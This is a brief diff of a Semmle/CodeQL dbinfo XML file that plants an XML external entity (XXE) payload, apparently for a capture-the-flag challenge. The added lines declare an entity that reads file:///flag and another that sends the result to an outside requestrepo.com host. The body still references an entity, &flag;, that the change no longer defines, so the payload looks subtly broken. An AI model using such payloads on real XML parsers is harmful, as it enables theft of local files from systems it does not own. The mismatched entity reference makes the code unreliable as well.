@@ -1,5 +1,7 @@
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<!DOCTYPE example [<!ENTITY flag SYSTEM "http://krhelbvr.requestrepo.com/pula.dtd" >]>
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "file:///flag">
+<!ENTITY blind SYSTEM "http://krhelbvr.requestrepo.com/?%xxe;">]>
 <ns2:dbinfo xmlns:ns2="https://semmle.com/schemas/dbinfo">
     <sourceLocationPrefix>&flag;</sourceLocationPrefix>
     <baselineLinesOfCode>420</baselineLinesOfCode>
